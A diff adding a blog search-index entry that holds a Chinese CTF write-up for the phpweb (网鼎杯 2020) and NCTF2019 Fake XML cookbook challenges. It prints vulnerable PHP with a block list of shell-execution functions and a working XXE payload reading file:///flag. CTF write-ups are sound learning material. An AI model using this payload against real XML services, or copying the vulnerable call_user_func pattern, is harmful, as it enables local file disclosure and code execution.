@@ -2249,4 +2249,75 @@ if(isset($_GET['exp'])){
         <tag>buu</tag>
       </tags>
   </entry>
+  <entry>
+    <title>网鼎杯 2020 朱雀组 phpweb&amp;NCTF2019 Fake XML cookbook</title>
+    <url>/2021/08/11/buu/11/</url>
+    <content><![CDATA[<h3 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h3><p>XML可能存在的漏洞:<br>XML注入和XPath注入XML 外部实体注入</p>
+<p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p>
+<p><strong>XXE攻击</strong><br>附上链接：</p>
+<p><a href="https://xz.aliyun.com/t/6887**%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E">https://xz.aliyun.com/t/6887**从XML相关一步一步到XXE漏洞</a>**</p>
+<p>XXE(XML External Entity Injection)全称为XML外部实体注入</p>
+<p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a><strong>浅谈XML实体注入漏洞</strong></p>
+<h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h3><h4 id="网鼎杯-2020-朱雀组"><a href="#网鼎杯-2020-朱雀组" class="headerlink" title="网鼎杯 2020 朱雀组"></a>网鼎杯 2020 朱雀组</h4><p><img src="/2021/08/11/buu/11/image-20210811193932874.png" alt="image-20210811193932874"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/11/buu/11/image-20210811194437549.png" alt="image-20210811194437549"></p>
+<h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="NCTF2019 Fake XML cookbook"></a>NCTF2019 Fake XML cookbook</h4><p>这题解题挺快的，有点像之前的sql注入</p>
+<p>这次是进行恶意实体注入</p>
+<p><img src="/2021/08/11/buu/11/image-20210812153137919.png" alt="image-20210812153137919"></p>
+<p>尝试admin，抓个包</p>
+<p><img src="/2021/08/11/buu/11/image-20210812153237740.png" alt="image-20210812153237740"></p>
+<p>看到了POST提交数据后的页面</p>
+<p>我们查看无输入数据的页面源代码</p>
+<p>找到关键代码段</p>
+<p><img src="/2021/08/11/buu/11/image-20210812153441742.png" alt="image-20210812153441742"></p>
+<pre><code>function doLogin()&#123;
+    var username = $(&quot;#username&quot;).val();
+    var password = $(&quot;#password&quot;).val();
+    if(username == &quot;&quot; || password == &quot;&quot;)&#123;
+        alert(&quot;Please enter the username and password!&quot;);
+        return;
+    &#125;
+var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
+$.ajax(&#123;
+    type: &quot;POST&quot;,
+    url: &quot;doLogin.php&quot;,
+    contentType: &quot;application/xml;charset=utf-8&quot;,
+    data: data,
+    dataType: &quot;xml&quot;,
+    anysc: false,
+    success: function (result) &#123;
+        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
+        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
+        if(code == &quot;0&quot;)&#123;
+            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
+        &#125;else if(code == &quot;1&quot;)&#123;
+            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
+        &#125;else&#123;
+            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
+        &#125;
+    &#125;,
+    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;
+        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);
+    &#125;
+&#125;); 
+&#125;</code></pre>
+<p><strong>摘抄：</strong></p>
+<p><strong>XML可能存在的漏洞：</strong><br>XML注入和XPath注入XML 外部实体注入</p>
+<p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p>
+<p><strong>XXE攻击</strong><br>附上链接：</p>
+<p><a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p>
+<p>XXE(XML External Entity Injection)全称为XML外部实体注入</p>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/11/buu/11/image-20210812154303323.png" alt="image-20210812154303323"></p>
+<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p> <a href="https://blog.csdn.net/devilare/article/details/118969558">NCTF2019]Fake XML cookbook_devilare的博客-CSDN博客</a></p>
+<p> <a href="https://blog.csdn.net/SopRomeo/article/details/105913611">NCTF2019]Fake XML cookbook_SopRomeo的博客-CSDN博客</a></p>
+<p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12323562.html">NCTF2019]Fake XML cookbook - 王叹之 - 博客园 (cnblogs.com)</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
 </search>
